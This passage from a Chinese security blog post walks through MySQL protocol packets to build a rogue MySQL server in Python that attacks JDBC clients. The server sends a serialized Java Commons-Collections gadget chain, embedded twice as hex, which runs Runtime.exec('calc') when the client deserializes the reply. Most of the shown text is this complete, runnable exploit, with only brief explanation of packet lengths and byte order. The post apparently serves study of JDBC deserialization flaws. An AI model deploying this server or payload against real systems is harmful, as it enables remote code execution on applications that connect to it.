class="line">            <span class="keyword">elif</span> <span class="string">&quot;show session status&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                <span class="comment">#column count</span></span><br><span class="line">                reply_data = <span class="string">&#x27;0100000102&#x27;</span></span><br><span class="line">                <span class="comment">#field packet(number 1)</span></span><br><span class="line">                reply_data+=<span class="string">&#x27;1a000002036465660001620162014201420c3f00ffff0000fcffff000000&#x27;</span></span><br><span class="line">                <span class="comment">#field packet(number 2)</span></span><br><span class="line">                reply_data+=<span class="string">&#x27;1a000003036465660001620162014201420c3f00ffff1000fcffff000000&#x27;</span></span><br></pre></td></tr></table></figure>

<p>现在，我们需要继续构造TABULAR剩余的row packet部分</p>
<p>首先计算packet length：</p>
<p>packet length计算的长度是我们的两个text的值再加上每个text length</p>
<p>因为我们的payload的长度会根据我们选用的利用链和命令而有变化，所以这里就直接用代码计算长度</p>
<p>先继续分析</p>
<p>结果集有两列,所以每一个row packet有两个值</p>
<p>计算第一个值text的长度:我们创建一个获取payload的函数,并指定默认弹出calc的payload</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_payload_content</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;file.txt&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            payload_content = f.read()</span><br><span class="line">    <span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">        payload_content=<span class="string">&#x27;aced0005737200116a6176612e7574696c2e48617368536574ba44859596b8b7340300007870770c000000023f40000000000001737200346f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6b657976616c75652e546965644d6170456e7472798aadd29b39c11fdb0200024c00036b65797400124c6a6176612f6c616e672f4f626a6563743b4c00036d617074000f4c6a6176612f7574696c2f4d61703b7870740003666f6f7372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e7471007e00037870767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647571007e001b00000002767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb34202000078707671007e001b7371007e00137571007e001800000002707571007e001800000000740006696e766f6b657571007e001b00000002767200106a6176612e6c616e672e4f626a656374000000000000000000000078707671007e00187371007e0013757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000078700000000174000463616c63740004657865637571007e001b0000000171007e00207371007e000f737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b020000787000000001737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000077080000001000000000787878&#x27;</span></span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        <span class="keyword">return</span> payload_content</span><br></pre></td></tr></table></figure>

<p>计算row packet的packet length</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">text_one_length=<span class="built_in">str</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(get_payload_content())//<span class="number">2</span>+<span class="number">1</span>+<span class="number">1</span>+<span class="number">2</span>))</span><br></pre></td></tr></table></figure>

<p>这里先除以2的原因是是以字节为单位计算，第一个+1+1是后面构造第一个text时为了简便只需要1个字节长度的内容，+2是因为payload长度很长，导致表示length需要2个字节</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">row_packet_length_hex=row_packet_length[<span class="number">4</span>:<span class="number">6</span>]+row_packet_length[<span class="number">2</span>:<span class="number">4</span>]+row_packet_length[<span class="number">0</span>:<span class="number">2</span>]</span><br><span class="line">                reply_data+=row_packet_length_hex+<span class="string">&quot;04&quot;</span>+<span class="string">&quot;fbfc&quot;</span></span><br></pre></td></tr></table></figure>

<p>第一行这样写是因为协议使用的是<strong>小端字节序</strong>,在小端字节序中，低位字节先存放</p>
<p>第二行的04代表包的序列,也就是第四个packet</p>
<p>fbfc按照逻辑应该是fb代表的是第一个text的length（251）,而fc代表的是text中的内容,但在这里明显是错误的，而我尝试了类似01xx这样的类似结果却不能成功，却只有fbfc可以，所以这里算是一个疑惑的点，知道为什么的师傅也希望能告诉我</p>
<p>最后就是构造2个text以及最后的应答包的实际内容，就不单独在赘述了</p>
<h3 id="完整的恶意Mysql服务"><a href="#完整的恶意Mysql服务" class="headerlink" title="完整的恶意Mysql服务"></a>完整的恶意Mysql服务</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="comment">#greeting包的伪造数据</span></span><br><span class="line">greeting_data=<span class="string">&#x27;4a0000000a382e302e313200170000000a170d656e32064600ffffc00200ffc31500000000000000000000605a28686d63690805351259006d7973716c5f6e61746976655f70617373776f726400&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#Response Ok包的伪造数据</span></span><br><span class="line">response_ok_data=<span class="string">&#x27;0700000200000002000000&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_payload_content</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;file.txt&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            payload_content = f.read()</span><br><span class="line">    <span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">        payload_content=<span class="string">&#x27;aced0005737200116a6176612e7574696c2e48617368536574ba44859596b8b7340300007870770c000000023f40000000000001737200346f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6b657976616c75652e546965644d6170456e7472798aadd29b39c11fdb0200024c00036b65797400124c6a6176612f6c616e672f4f626a6563743b4c00036d617074000f4c6a6176612f7574696c2f4d61703b7870740003666f6f7372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e7471007e00037870767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647571007e001b00000002767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb34202000078707671007e001b7371007e00137571007e001800000002707571007e001800000000740006696e766f6b657571007e001b00000002767200106a6176612e6c616e672e4f626a656374000000000000000000000078707671007e00187371007e0013757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000078700000000174000463616c63740004657865637571007e001b0000000171007e00207371007e000f737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b020000787000000001737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000077080000001000000000787878&#x27;</span></span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        <span class="keyword">return</span> payload_content</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_data</span>(<span class="params">conn,data</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;向目标JDBC发送数据 : &#123;&#125;&quot;</span>.<span class="built_in">format</span>(data))</span><br><span class="line">    conn.send(binascii.a2b_hex(data))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">receive_data</span>(<span class="params">conn</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        data = conn.recv(<span class="number">1024</span>)</span><br><span class="line">    <span class="keyword">except</span> ConnectionResetError:</span><br><span class="line">        <span class="keyword">raise</span> ConnectionResetError(<span class="string">&quot;\n通信结束\n&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(data).lower()</span><br><span class="line"><span class="comment">#程序入口</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment">#设置端口</span></span><br><span class="line">    host=<span class="string">&quot;0.0.0.0&quot;</span></span><br><span class="line">    port=<span class="number">3309</span></span><br><span class="line">    <span class="comment">#开启一个socket接受JDBC的连接</span></span><br><span class="line">    sql_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    <span class="comment">#一旦断开连接就立马重置端口，这样不用每次等待一段时间才能重新使用该端口</span></span><br><span class="line">    sql_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line">    <span class="comment">#绑定ip</span></span><br><span class="line">    sql_server.bind((host, port))</span><br><span class="line">    <span class="comment">#将socket设置为被动监听模式，并且一次只能接受一个连接</span></span><br><span class="line">    sql_server.listen(<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;恶意mysql已在<span class="subst">&#123;host&#125;</span>:<span class="subst">&#123;port&#125;</span>开启&quot;</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="comment">#conn为连接句柄,addr为接受请求的源地址</span></span><br><span class="line">        conn, addr = sql_server.accept()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;接受到来自&#123;&#125;:&#123;&#125;的连接请求&quot;</span>.<span class="built_in">format</span>(addr[<span class="number">0</span>],addr[<span class="number">1</span>]))</span><br><span class="line">        <span class="comment">#发送greeting包</span></span><br><span class="line">        send_data(conn,greeting_data)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                data=receive_data(conn)</span><br><span class="line">            <span class="keyword">except</span> ConnectionResetError:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;over&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;接受到的data:&quot;</span>,data)</span><br><span class="line">            <span class="comment">#收到Login包</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;password&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                send_data(conn,response_ok_data)</span><br><span class="line">            <span class="comment">#收到Request Query包，其中包含session.auto_increment_increment</span></span><br><span class="line">            <span class="keyword">elif</span> <span class="string">&quot;session.auto_increment_increment&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                reply_data=<span class="string">&quot;01000001122e00000203646566000000186175746f5f696e6372656d656e745f696e6372656d656e74000c3f001500000008a0000000002a00000303646566000000146368617261637465725f7365745f636c69656e74000c21000c000000fd00001f00002e00000403646566000000186368617261637465725f7365745f636f6e6e656374696f6e000c21000c000000fd00001f00002b00000503646566000000156368617261637465725f7365745f726573756c7473000c21000c000000fd00001f00002a00000603646566000000146368617261637465725f7365745f736572766572000c21000c000000fd00001f0000260000070364656600000010636f6c6c6174696f6e5f736572766572000c21002d000000fd00001f00002a0000080364656600000014636f6c6c6174696f6e5f636f6e6e656374696f6e000c21002d000000fd00001f000022000009036465660000000c696e69745f636f6e6e656374000c21002a000000fd00001f00002900000a0364656600000013696e7465726163746976655f74696d656f7574000c3f001500000008a0000000001d00000b03646566000000076c6963656e7365000c210009000000fd00001f00002c00000c03646566000000166c6f7765725f636173655f7461626c655f6e616d6573000c3f001500000008a0000000002800000d03646566000000126d61785f616c6c6f7765645f7061636b6574000c3f001500000008a0000000002700000e03646566000000116e65745f77726974655f74696d656f7574000c3f001500000008a0000000001e00000f036465660000000873716c5f6d6f6465000c21005f010000fd00001f000026000010036465660000001073797374656d5f74696d655f7a6f6e65000c21001b000000fd00001f00001f000011036465660000000974696d655f7a6f6e65000c210012000000fd00001f00002b00001203646566000000157472616e73616374696f6e5f69736f6c6174696f6e000c21002d000000fd00001f000022000013036465660000000c776169745f74696d656f7574000c3f001500000008a000000000f9000014013104757466380475746638047574663804757466380f757466385f756e69636f64655f63690f757466385f67656e6572616c5f63690e534554204e414d45532075746638033132300347504c0131083136373737323136023630754f4e4c595f46554c4c5f47524f55505f42592c5354524943545f5452414e535f5441424c45532c4e4f5f5a45524f5f494e5f444154452c4e4f5f5a45524f5f444154452c4552524f525f464f525f4449564953494f4e5f42595f5a45524f2c4e4f5f454e47494e455f535542535449545554494f4e0cd6d0b9fab1ead7bccab1bce40653595354454d0f52455045415441424c452d524541440331323007000015fe000002000000&quot;</span></span><br><span class="line">                send_data(conn,reply_data)</span><br><span class="line">            <span class="comment">#收到Request Query包，其中包含SET</span></span><br><span class="line">            <span class="keyword">elif</span> <span class="string">&quot;set&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                send_data(conn,response_ok_data)</span><br><span class="line">            <span class="keyword">elif</span> <span class="string">r&quot;select @@session.autocommit&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                reply_data=<span class="string">&quot;01000001012a0000020364656600000014404073657373696f6e2e6175746f636f6d6d6974000c3f000100000008800000000002000003013107000004fe000002000000&quot;</span></span><br><span class="line">                send_data(conn,reply_data)</span><br><span class="line">            <span class="keyword">elif</span> <span class="string">&quot;show session status&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                <span class="comment">#column count</span></span><br><span class="line">                reply_data = <span class="string">&#x27;0100000102&#x27;</span></span><br><span class="line">                <span class="comment">#field packet(number 1)</span></span><br><span class="line">                reply_data+=<span class="string">&#x27;1a000002036465660001620162014201420c3f00ffff0000fcffff000000&#x27;</span></span><br><span class="line">                <span class="comment">#field packet(number 2)</span></span><br><span class="line">                reply_data+=<span class="string">&#x27;1a000003036465660001620162014201420c3f00ffff1000fcffff000000&#x27;</span></span><br><span class="line">                <span class="comment">#获取payload</span></span><br><span class="line">                payload_content=get_payload_content()</span><br><span class="line">                </span><br><span class="line">                <span class="comment">#计算长度</span></span><br><span class="line">                row_packet_length=<span class="built_in">str</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(get_payload_content())//<span class="number">2</span>+<span class="number">4</span>)).replace(<span class="string">&quot;0x&quot;</span>,<span class="string">&quot;&quot;</span>).zfill(<span class="number">6</span>)</span><br><span class="line">                row_packet_length_hex=row_packet_length[<span class="number">4</span>:<span class="number">6</span>]+row_packet_length[<span class="number">2</span>:<span class="number">4</span>]+row_packet_length[<span class="number">0</span>:<span class="number">2</span>]</span><br><span class="line">                reply_data+=row_packet_length_hex+<span class="string">&quot;04&quot;</span>+<span class="string">&quot;fbfc&quot;</span></span><br><span class="line">                </span><br><span class="line">                <span class="comment">#第一个text</span></span><br><span class="line">                text_length=<span class="built_in">str</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(get_payload_content())//<span class="number">2</span>)).replace(<span class="string">&quot;0x&quot;</span>,<span class="string">&quot;&quot;</span>).zfill(<span class="number">4</span>)</span><br><span class="line">                text_length_hex=text_length[<span class="number">2</span>:<span class="number">4</span>]+text_length[<span class="number">0</span>:<span class="number">2</span>]</span><br><span class="line">                reply_data+=text_length_hex</span><br><span class="line">                reply_data+=<span class="built_in">str</span>(payload_content)               </span><br><span class="line">                <span class="comment">#第二个text</span></span><br><span class="line">                </span><br><span class="line">               </span><br><span class="line">                <span class="comment">#response OK</span></span><br><span class="line">                reply_data += <span class="string">&#x27;070000b3fe000002000000&#x27;</span></span><br><span class="line">                send_data(conn, reply_data)</span><br><span class="line">            <span class="keyword">elif</span> <span class="string">&quot;show warnings&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                payload = <span class="string">&#x27;01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f00006d000005044e6f74650431313035625175657279202753484f572053455353494f4e20535441545553272072657772697474656e20746f202773656c6563742069642c6f626a2066726f6d2063657368692e6f626a73272062792061207175657279207265777269746520706c7567696e07000006fe000002000000&#x27;</span></span><br><span class="line">                send_data(conn, payload)</span><br></pre></td></tr></table></figure>

</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://wustzhb.github.io">lanb0</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://wustzhb.github.io/2023/04/18/2023-04-18-JDBC%E2%99%A5MYSQL%E4%B9%8B%E9%97%B4%E4%B8%8D%E5%BE%97%E4%B8%8D%E8%AF%B4%E7%9A%84%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/">https://wustzhb.github.io/2023/04/18/2023-04-18-JDBC%E2%99%A5MYSQL%E4%B9%8B%E9%97%B4%E4%B8%8D%E5%BE%97%E4%B8%8D%E8%AF%B4%E7%9A%84%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://wustzhb.github.io" target="_blank">Lanb0's blog|一个默默无闻的网安爱好者</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a><a class="post-meta__tags" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">反序列化</a><a class="post-meta__tags" href="/tags/JDBC/">JDBC</a><a class="post-meta__tags" href="/tags/MYSQL/">MYSQL</a><a class="post-meta__tags" href="/tags/Wireshark/">Wireshark</a></div><div class="post_share"><div class="social-share" data-image="/img/head.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/05/08/%E5%85%8D%E6%9D%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95--C++%E6%93%8D%E4%BD%9C%E6%B3%A8%E5%86%8C%E8%A1%A8%E7%BC%96%E5%86%99%E5%BC%80%E6%9C%BA%E8%87%AA%E5%90%AF%E7%A8%8B%E5%BA%8F/" title="免杀学习记录--C++操作注册表编写开机自启程序"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">免杀学习记录--C++操作注册表编写开机自启程序</div></div></a></div><div class="next-post pull-right"><a href="/2023/04/18/%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E6%9D%A5%E7%9C%8BJDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(%5B%E7%BE%8A%E5%9F%8E%E6%9D%AF-2020%5DA-Piece-Of-Java)/" title="从一道题来看JDBC反序列化([羊城杯 2020]A Piece Of Java)"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">从一道题来看JDBC反序列化([羊城杯 2020]A Piece Of Java)</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2023/04/18/%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E6%9D%A5%E7%9C%8BJDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(%5B%E7%BE%8A%E5%9F%8E%E6%9D%AF-2020%5DA-Piece-Of-Java)/" title="从一道题来看JDBC反序列化([羊城杯 2020]A Piece Of Java)"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-04-18</div><div class="title">从一道题来看JDBC反序列化([羊城杯 2020]A Piece Of Java)</div></div></a></div><div><a href="/2023/05/16/%5B2023AliyunCTF%5DWEB%E9%A2%98%E5%A4%8D%E7%8E%B0/" title="[2023阿里云CTF]ezBean复现及相关fastjson机制深入分析"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-05-16</div><div class="title">[2023阿里云CTF]ezBean复现及相关fastjson机制深入分析</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/head.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">lanb0</div><div class="author-info__description">充实地过好每一天</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">10</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">21</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">11</div></a></div><div class="card-info-social-icons is-center"><a class="social-icon" href="https://qm.qq.com/cgi-bin/qm/qr?k=Ga7oV2UM08biI8VudKTeFcEdzYPbbXdz&amp;noverify=0&amp;personal_qrcode_source=4" target="_blank" title="QQ"><i class="fab fa-qq"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">没什么大事要宣布的</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%88%E5%9B%9E%E9%A1%BE%E4%B8%80%E4%B8%8BJDBC%E5%92%8CMYSQL%E7%9A%84%E9%80%9A%E4%BF%A1%E8%BF%87%E7%A8%8B"><span class="toc-number">1.</span> <span class="toc-text">先回顾一下JDBC和MYSQL的通信过程:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">2.</span> <span class="toc-text">环境搭建:</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%99%E9%87%8C%E6%9C%89%E5%A4%A7%E5%9D%91%EF%BC%8C%E6%B3%A8%E6%84%8F%EF%BC%81"><span class="toc-number">2.1.</span> <span class="toc-text">这里有大坑，注意！</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90"><span class="toc-number">3.</span> <span class="toc-text">流量分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Info-Server-Greeting-proto-x3D-10-version-x3D-8-0-12"><span class="toc-number">3.1.</span> <span class="toc-text">Info:Server Greeting proto&#x3D;10 version&#x3D;8.0.12</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Info-Login-Request-user-x3D-root-db-x3D-test"><span class="toc-number">3.2.</span> <span class="toc-text">Info:Login Request user&#x3D;root db&#x3D;test</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Info-Response-OK"><span class="toc-number">3.3.</span> <span class="toc-text">Info: Response  OK</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Info-Request-Query"><span class="toc-number">3.4.</span> <span class="toc-text">Info:Request Query</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Info-Response-TABULAR-Response-OK"><span class="toc-number">3.5.</span> <span class="toc-text">Info:Response TABULAR Response  OK</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Info-Request-Query-1"><span class="toc-number">3.6.</span> <span class="toc-text">Info: Request Query</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Info-Request-Query-SELECT-session-autocommit"><span class="toc-number">3.7.</span> <span class="toc-text">Info: Request Query(SELECT @@session.autocommit)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Info-Response-TABULAR-Response-OK-SELECT-session-autocommit"><span class="toc-number">3.8.</span> <span class="toc-text">Info:Response TABULAR Response  OK (SELECT @@session.autocommit)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Info-Request-Query-SHOW-SESSION-STATUS"><span class="toc-number">3.9.</span> <span class="toc-text">Info: Request Query(SHOW SESSION STATUS)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Info-Response-TABULAR-Response-OK-SHOW-SESSION-STATUS"><span class="toc-number">3.10.</span> <span class="toc-text">Info:Response TABULAR Response  OK (SHOW SESSION STATUS)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%8C%E6%95%B4%E7%9A%84%E6%81%B6%E6%84%8FMysql%E6%9C%8D%E5%8A%A1"><span 